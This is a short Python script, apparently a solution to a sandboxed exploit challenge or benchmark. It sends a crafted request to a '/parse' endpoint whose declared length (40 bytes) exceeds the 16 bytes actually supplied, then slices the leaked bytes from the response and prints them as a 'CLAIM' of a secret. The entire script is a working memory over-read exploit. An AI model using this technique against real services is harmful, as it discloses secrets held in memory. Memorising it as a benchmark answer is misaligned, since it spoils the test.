import json,sys,base64
def req(m,p,**kw):
    payload = {"method":m,"path":p}; payload.update(kw)
    print(json.dumps({"http":payload}),flush=True)
    return json.loads(sys.stdin.readline())
req("GET","/health")
r = req("POST","/parse", body_hex="0028" + "41"*16)
d = json.loads(base64.b64decode(r["body_b64"]))
leaked = d["record_hex"][32:]
print("CLAIM:"+json.dumps({"secret_hex":leaked}))